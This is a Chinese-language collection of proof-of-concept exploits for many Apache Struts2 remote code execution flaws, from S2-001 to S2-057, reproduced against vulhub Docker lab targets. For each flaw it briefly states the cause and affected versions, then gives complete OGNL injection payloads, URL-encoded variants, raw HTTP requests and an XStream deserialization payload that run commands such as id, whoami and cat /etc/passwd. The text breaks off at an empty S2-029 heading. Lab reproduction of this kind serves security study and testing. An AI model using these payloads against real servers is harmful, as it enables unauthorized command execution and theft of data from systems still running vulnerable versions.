# Struts2的POC合集
S2-001/S2-005/S2-007/S2-008/S2-009/S2-012/S2-013/S2-015/S2-016/S2-045/S2-048/S2-052/S2-053/S2-057/S2-019/S2-029/S2-devMode的漏洞复现合集。

Apache Struts2 是一个基于MVC设计模式的Web应用框架，会对某些标签属性（比如 id）的属性值进行二次表达式解析，因此在某些场景下将可能导致远程代码执行。
专注于漏洞攻防的华云安集结了堪称史上最全的Struts2 漏洞复现合集，共17个。

## S2-001复现

原理：该漏洞因用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL表达式%{value}进行解析，然后重新填充到对应的表单数据中。如注册或登录页面，提交失败后一般会默认返回之前提交的数据，由于后端使用%{value}对提交的数据执行了一次OGNL 表达式解析，所以可以直接构造 Payload进行命令执行。

影响版本：Struts 2.0.0 - 2.0.8

复现步骤

1\. 进入vulhub目录下漏洞环境的目录

命令：cd ../soft/vulhub-master/structs2/s2-001

![](_v_images/20200819094713306_12905.png)

![](_v_images/20200819094712595_11612.png)

2.自动编译化环境

命令：docker-compose build

![](_v_images/20200819094711986_24934.png)

3.启动整个编译环境

docker-compose up -d

![](_v_images/20200819094711376_27972.png)

4.查看是否启动成功

docker ps(正在运行的环境)

![](_v_images/20200819094710669_13936.png)

5.然后访问靶机IP192.168.100.244:8080

![](_v_images/20200819094710061_16407.png)

6\. 先来测试一下是否真的存在远程代码执行

![](_v_images/20200819094709446_3159.png)

返回了参数值说明漏洞存在

![](_v_images/20200819094708835_22632.png)

7.构造poc，填到password框

Poc：%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}

![](_v_images/20200819094708225_27676.png)

语句被执行，查看返回的语句是/user/local/tomcat，即tomcat的执行语句

![](_v_images/20200819094707510_8345.png)

8.构造获取web路径poc：

> %{
> 
> #req=@org.apache.struts2.ServletActionContext@getRequest(),
> 
> #response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),
> 
> #response.println(#req.getRealPath("/")),
> 
> #response.flush(),
> 
> #response.close()
> 
> }

![](_v_images/20200819094706798_952.png)

可见返回了web路径,为/usr/local/tomcat/webapps/ROOT

![](_v_images/20200819094706188_9249.png)

9.构造查看权限的poc：

Poc：

> %{
> 
> #a=(new java.lang.ProcessBuilder(new java.lang.String\[\]{"whoami"})).redirectErrorStream(true).start(),
> 
> #b=#a.getInputStream(),
> 
> #c=new java.io.InputStreamReader(#b),
> 
> #d=new java.io.BufferedReader(#c),
> 
> #e=new char\[50000\],
> 
> #d.read(#e),
> 
> #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
> 
> #f.getWriter().println(new java.lang.String(#e)),
> 
> #f.getWriter().flush(),#f.getWriter().close()
> 
> }

![](_v_images/20200819094705578_756.png)

返回的是root

![](_v_images/20200819094704969_20527.png)

10\. 执行任意命令时只需要，将上面poc里whoami的命令替换

> %{
> 
> #a=(new java.lang.ProcessBuilder(new java.lang.String\[\]{"cat","/etc/passwd"})).redirectErrorStream(true).start(),
> 
> #b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),
> 
> #d=new java.io.BufferedReader(#c),
> 
> #e=new char\[50000\],#d.read(#e),
> 
> #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
> 
> #f.getWriter().println(new java.lang.String(#e)),
> 
> #f.getWriter().flush(),
> 
> #f.getWriter().close()
> 
> }

![](_v_images/20200819094704359_7911.png)

![](_v_images/20200819094703749_20259.png)

11\. 关闭docker环境

命令：docker-compose down -v

![](_v_images/20200819094702836_2325.png)

## S2-005复现

原理：s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\\u0023)或8进制(\\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开

影响版本：Struts 2.0.0-2.1.8.1

复现步骤

1.进入到005的环境目录下并启动环境

命令：docker-compose up -d

![](_v_images/20200819094702328_22954.png)

2.访问靶机：http://192.168.100.244:8080/

![](_v_images/20200819094701820_27983.png)

3.构造poc发送数据包，使用抓包工具burp suite，修改数据包插入poc

Poc1：

(%27%5cu0023_memberAccess\[%5c%27allowStaticMethodAccess%5c%27\]%27)(vaaa)=true&(aaaa)((%27%5cu0023context\[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27\]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(("%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))")(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1

![](_v_images/20200819094701310_8596.png)

![](_v_images/20200819094700699_6580.png)

Poc2：

?%27%2B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29%2B%27

![](_v_images/20200819094659876_17804.png)

4.查看数据连接状态

![](_v_images/20200819094658760_24207.png)

命令：docker exec -it ea8f121978e0  /bin/bash

ls /tmp

![](_v_images/20200819094658052_23135.png)

## S2-007复现

原理：age来自于用户输入，传递一个非整数给id导致错误，struts会将用户的输入当作ongl表达式执行，从而导致了漏洞

影响版本：Struts 2.0.0 - 2.2.3

复现步骤：

1.进入到007的环境目录下并启动环境

命令：cd ../s2-007

命令：docker-compose up -d

![](_v_images/20200819094657545_2017.png)

2.访问靶机：http://192.168.100.244:8080/

![](_v_images/20200819094657038_21885.png)

3.构造poc，使用抓包工具burp suite，修改数据包插入poc

%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%20/%27%29.getInputStream%28%29%29%29+%2B+%27

![](_v_images/20200819094656527_8410.png)

Poc2：

" \+ (#_memberAccess\["allowStaticMethodAccess"\]=true,#foo=new java.lang.Boolean("false") ,#context\["xwork.MethodAccessor.denyMethodExecution"\]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("whoami").getInputStream())) + "

![](_v_images/20200819094655513_21962.png)

![](_v_images/20200819094655003_2445.png)

![](_v_images/20200819094654493_15108.png)

查看日志

命令：docker ps 找到对应id

![](_v_images/20200819094653676_22944.png)

命令：docker exec  -it fb40896f2b09 /bin/bash

cd logs

![](_v_images/20200819094653168_326.png)

![](_v_images/20200819094652660_9934.png)

命令：cat  localhost\_access\_log.2020-07-13.txt

日志显示访问成功

![](_v_images/20200819094652050_15731.png)

## S2-008复现

原理：S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，但是这种情况在生产环境中几乎不可能存在，所以还是很鸡肋。

影响版本：Struts 2.1.0 – 2.3.1

复现步骤：

1.进入到008的环境目录下并启动环境

命令：cd ../s2-008

命令：docker-compose up -d

![](_v_images/20200819094651136_7278.png)

2.访问靶机：http://192.168.100.244:8080/

![](_v_images/20200819094650629_12422.png)

3.构造poc，使用抓包工具burp suite，修改数据包插入poc

Poc：

devmode.action?debug=command&expression=(%23\_memberAccess=@ognl.OgnlContext@DEFAULT\_MEMBER_ACCESS)%3f(%23context\[%23parameters.rpsobj\[0\]\].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command\[0\]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=id

![](_v_images/20200819094650019_29025.png)

![](_v_images/20200819094649510_802.png)

## S2-009复现

原理：OGNL提供了广泛的表达式评估功能等功能。该漏洞允许恶意用户绕过ParametersInterceptor内置的所有保护（正则表达式，拒绝方法调用），从而能够将任何暴露的字符串变量中的恶意表达式注入进行进一步评估。ParametersInterceptor中的正则表达式将top \["foo"\]（0）作为有效的表达式匹配，OGNL将其作为（top \["foo"\]）（0）处理，并将“foo”操作参数的值作为OGNL表达式求值。这使得恶意用户将任意的OGNL语句放入由操作公开的任何String变量中，并将其评估为OGNL表达式，并且由于OGNL语句在HTTP参数中，攻击者可以使用黑名单字符（例如＃）禁用方法执行并执行任意方法，绕过ParametersInterceptor和OGNL库保护。

影响版本：Struts 2.1.0 - 2.3.1.1

复现步骤：

1.进入到009的环境目录下并启动环境

命令：cd ../s2-009

命令：docker-compose up -d

![](_v_images/20200819094648696_17426.png)

2.访问靶机：http://192.168.100.244:8080/

![](_v_images/20200819094647884_10195.png)

3.构造poc，使用抓包工具burp suite，修改数据包插入poc

Poc1：

/ajax/example5.action?age=12313&name=(%23context\[%22xwork.MethodAccessor.denyMethodExecution%22\]=+new+java.lang.Boolean(false),+%23_memberAccess\[%22allowStaticMethodAccess%22\]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27ls%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char\[51020\],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z\[(name)(%27meh%27)\]

![](_v_images/20200819094647171_18543.png)

![](_v_images/20200819094646053_29151.png)

Poc2：

POST /ajax/example5 HTTP/1.1

Accept: */*

Connection: keep-alive

Content-Type: application/x-www-form-urlencoded

Content-Length: 425

Host: 

z\[%28name%29%28%27meh%27%29\]&age=12313&name=(#context\["xwork.MethodAccessor.denyMethodExecution"\]=false,#_memberAccess\["allowStaticMethodAccess"\]=true,#a=@java.lang.Runtime@getRuntime().exec("id").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char\[50000\],#c.read(#d),#s=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#s.println(#d),#s.close())(meh)

![](_v_images/20200819094645342_4610.png)

## S2-012复现

原理：如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。

影响版本：Struts 2.1.0-2.3.13

复现步骤：

1.进入到012的环境目录下并启动环境

命令：cd ../s2-012

命令：docker-compose up -d

![](_v_images/20200819094644628_28573.png)

2.访问靶机http://192.168.100.244:8080

![](_v_images/20200819094643917_11412.png)

3.构造poc，使用抓包工具burp suite，修改数据包插入poc

Poc1：

%25%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%22%2f%62%69%6e%2f%62%61%73%68%22%2c%22%2d%63%22%2c%20%22%6c%73%22%7d%29%29%2e%72%65%64%69%72%65%63%74%45%72%72%6f%72%53%74%72%65%61%6d%28%74%72%75%65%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%66%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%22%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%22%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%23%65%29%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d

![](_v_images/20200819094643408_23204.png)

Poc2：

原始poc：

%{#a=(new java.lang.ProcessBuilder(new java.lang.String\[\]{"/bin/bash","-c", "ls})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char\[50000\],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}

注：利用此漏洞需要进行url编码

%25%7B#a=(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B%22cat%22,%20%22/etc/passwd%22%7D)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new%20java.io.InputStreamReader(#b),#d=new%20java.io.BufferedReader(#c),#e=new%20char%5B50000%5D,#d.read(#e),#f=#context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22),#f.getWriter().println(new%20java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()%7D

![](_v_images/20200819094642591_14334.png)

## S2-013复现

原理：struts2的标签中  和  都有一个 includeParams 属性，可以设置成如下值

- none - URL中不包含任何参数（默认）
    
- get - 仅包含URL中的GET参数
    
- all - 在URL中包含GET和POST参数
    

此时 或尝试去解析原始请求参数时，会导致OGNL表达式的执行

影响版本：Struts 2.0.0-2.3.14

复现步骤：

1.进入到013的环境目录下并启动环境

命令：cd ../s2-013

命令：docker-compose up -d

![](_v_images/20200819094641776_17749.png)

2\. 访问靶机http://192.168.100.244:8080

![](_v_images/20200819094640964_26652.png)

3.构造poc，使用抓包工具burp suite，修改数据包插入poc

Poc：

a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec("id").getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println("dbapp%3D"%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D

![](_v_images/20200819094640454_25738.png)

![](_v_images/20200819094639846_12276.png)

![](_v_images/20200819094639235_15737.png)

## S2-015复现

原理：如果一个请求与任何其他定义的操作不匹配，它将被匹配*，并且所请求的操作名称将用于以操作名称加载JSP文件。并且，1作为OGNL表达式的威胁值，{ }可以在服务器端执行任意的Java代码。这个漏洞是两个问题的组合：

- 请求的操作名称未被转义或再次检查白名单
    
- 在TextParseUtil.translateVariables使用组合$和%开放字符时对OGNL表达式进行双重评。
    

影响版本：Struts 2.0.0 - 2.3.14.2

复现步骤：

1.进入到015的环境目录下并启动环境

命令：cd ../s2-015

命令：docker-compose up -d

![](_v_images/20200819094638523_3983.png)

2\. 访问靶机http://192.168.100.244:8080

![](_v_images/20200819094637912_27390.png)

3.构造poc，使用抓包工具burp suite，修改数据包插入poc

Poc1：

${#context\["xwork.MethodAccessor.denyMethodExecution"\]=false,#m=#\_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#m.setAccessible(true),#m.set(#\_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream()),#q}

注：这里直接使用是没有用的需要进行url编码才能使用

%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23\_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23\_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%2C%23q%7D.action

![](_v_images/20200819094637304_1571.png)

![](_v_images/20200819094636694_27376.png)

Poc2：

${#context\[‘xwork.MethodAccessor.denyMethodExecution’\]=false,#m=#\_memberAccess.getClass().getDeclaredField(‘allowStaticMethodAccess’),#m.setAccessible(true),#m.set(#\_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(‘ls’).getInputStream()),#q}.action。

url编码之后：

%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23\_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23\_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ls%27%29.getInputStream%28%29%29%2C%23q%7D.action

![](_v_images/20200819094635879_7792.png)

![](_v_images/20200819094635268_17202.png)

## S2-016复现

原理：问题主要出在对于特殊URL处理中，redirect与redirectAction后面跟上Ognl表达式会被服务器执行。

影响版本：Struts 2.0.0 – 2.3.15

复现步骤：

1.进入到016的环境目录下并启动环境

命令：cd ../s2-016

命令：docker-compose up -d

![](_v_images/20200819094634354_31106.png)

2\. 访问靶机http://192.168.100.244:8080

![](_v_images/20200819094633746_8087.png)

3.构造poc，使用抓包工具burp suite，修改数据包插入poc

Poc：

index.action?redirect:%24%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%27%6c%73%27%2c%27%2f%27%7d%29%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%6d%61%74%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%23%65%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d

![](_v_images/20200819094633238_13377.png)

![](_v_images/20200819094632626_7382.png)

## S2-045复现

原理：在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。

影响版本：

- Struts2.3.5 – 2.3.31
    
- Struts2.5 – 2.5.10
    

复现步骤：

1.进入到045的环境目录下并启动环境

命令：cd ../s2-045

命令：docker-compose up -d

![](_v_images/20200819094631712_5730.png)

2\. 访问靶机http://192.168.100.244:8080/doUpload.action

![](_v_images/20200819094631101_6683.png)

3.构造poc，使用抓包工具burp suite，修改数据包插入poc

Poc：

%{(#test="multipart/form-data").(#dm=@ognl.OgnlContext@DEFAULT\_MEMBER\_ACCESS).(#\_memberAccess?(#\_memberAccess=#dm):((#container=#context\["com.opensymphony.xwork2.ActionContext.container"\]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(100*5000)).(#ros.flush())}

![](_v_images/20200819094630591_13769.png)

## S2-048复现

原理：Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限

影响版本：Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本

复现步骤

1.进入到048的环境目录下并启动环境

命令：cd ../s2-048

命令：docker-compose up -d

![](_v_images/20200819094629877_29190.png)

2\. 访问靶机http://192.168.100.244:8080/integration/editGangster.action

![](_v_images/20200819094629267_12114.png)

3.构造poc，使用抓包工具burp suite，修改数据包插入poc

Poc1：

%{(#dm=@ognl.OgnlContext@DEFAULT\_MEMBER\_ACCESS).(#\_memberAccess?(#\_memberAccess=#dm):((#container=#context\["com.opensymphony.xwork2.ActionContext.container"\]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream())).(#q)}

![](_v_images/20200819094628655_13577.png)

![](_v_images/20200819094628043_22169.png)

Poc2：

name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT\_MEMBER\_ACCESS%29.%28%23\_memberAccess%3F%28%23\_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23q%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29.getInputStream%28%29%29%29.%28%23q%29%7D

![](_v_images/20200819094627232_14982.png)

## S2-052复现

原理：Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。

影响版本：

- Struts 2.1.2 - Struts 2.3.33
    
- Struts 2.5 - Struts 2.5.12
    

复现步骤：

1.进入到052的环境目录下并启动环境

命令：cd ../s2-052

命令：docker-compose up -d

![](_v_images/20200819094626417_22595.png)

2\. 访问靶机http://192.168.100.244:8080

![](_v_images/20200819094625707_27427.png)

点击edit进入到http://192.168.100.244:8080/orders/3/edit页面下，点击一下submit

![](_v_images/20200819094625095_20171.png)

![](_v_images/20200819094624482_22060.png)

3.构造poc, 使用抓包工具burp suite，修改数据包插入poc

Poc：

<map>

<entry>

<jdk.nashorn.internal.objects.NativeString>

<flags>0</flags>

<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">

<dataHandler>

<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">

<is class="javax.crypto.CipherInputStream">

<cipher class="javax.crypto.NullCipher">

<initialized>false</initialized>

<opmode>0</opmode>

<serviceIterator class="javax.io.spi.FilterIterator">

<iter class="javax.io.spi.FilterIterator">

<iter class="java.util.Collections$EmptyIterator"/>

<next class="java.lang.ProcessBuilder">

<command>

<string>touch</string>

<string>/tmp/test.txt</string>

</command>

<redirectErrorStream>false</redirectErrorStream>

</next>

</iter>

<filter class="javax.io.ImageIO$ContainsFilter">

<method>

<class>java.lang.ProcessBuilder</class>

<name>start</name>

<parameter-types/>

</method>

<name>foo</name>

</filter>

<next>foo</next>

</serviceIterator>

<lock/>

</cipher>

<input class="java.lang.ProcessBuilder$NullInputStream"/>

<ibuffer/>

<done>false</done>

<ostart>0</ostart>

<ofinish>0</ofinish>

<closed>false</closed>

</is>

<consumed>false</consumed>

</dataSource>

<transferFlavors/>

</dataHandler>

<dataLen>0</dataLen>

</value>

</jdk.nashorn.internal.objects.NativeString>

<jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>

</entry>

<entry>

<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>

<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>

</entry>

</map>

![](_v_images/20200819094623671_18411.png)

3.执行docker-compose exec struts2 ls /tmp/ 查看命令是否执行成功

![](_v_images/20200819094622757_17653.png)

## S2-053复现

原理：Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。

影响版本：

- Struts 2.0.1-2.3.33
    
- Struts 2.5-2.5.10
    

复现步骤：

1.进入到053的环境目录下并启动环境

命令：cd ../s2-053

命令：docker-compose up -d

![](_v_images/20200819094622248_16652.png)

2.访问靶机http://192.168.100.244:8080/hello

![](_v_images/20200819094621741_25245.png)

3.构造poc, 使用抓包工具burp suite，修改数据包插入poc

Poc：

redirectUri=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT\_MEMBER\_ACCESS%29.%28%23\_memberAccess%3F%28%23\_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmds%3D%28%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%27id%27%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D%0A

![](_v_images/20200819094621230_17261.png)

## S2-057复现

原理：

- -alwaysSelectFullNamespace为true。
    
- -action元素没有设置namespace属性，或者使用了通配符。
    
- 命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞
    

影响版本：

- Struts 2.3–2.3.34
    
- Struts2.5–2.5.16
    

复现步骤：

1.进入到057的环境目录下并启动环境

命令：cd ../s2-057

命令：docker-compose up -d

![](_v_images/20200819094620315_935.png)

2.访问靶机192.168.100.244:8080/index

![](_v_images/20200819094619809_5341.png)

3.构造poc，使用抓包工具burp suite，修改数据包插入poc

Poc：

/index/%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT\_MEMBER\_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D/actionChain1.action

![](_v_images/20200819094618997_28731.png)

## S2-019复现

原理：要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中

影响版本：Struts 2.0.0 - 2.3.15.1

复现步骤：

1、拉取漏洞环境镜像到本地

命令：docker pull medicean/vulapps:s\_struts2\_s2-019

![](_v_images/20200819094618286_30777.png)

2、启动漏洞环境

命令：docker run -d -p 8080:8080 medicean/vulapps:s\_struts2\_s2-019

![](_v_images/20200819094617576_7444.png)

3、访问192.168.50.118:8080

![](_v_images/20200819094617068_18709.png)

4、poc 利用

?debug=command&expression=#a=(new java.lang.ProcessBuilder("id")).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char\[50000\],#d.read(#e),#out=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#out.getWriter().println("dbapp:"+new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()

注：利用时需对poc进行url编码

![](_v_images/20200819094616560_19038.png)

## S2-029复现

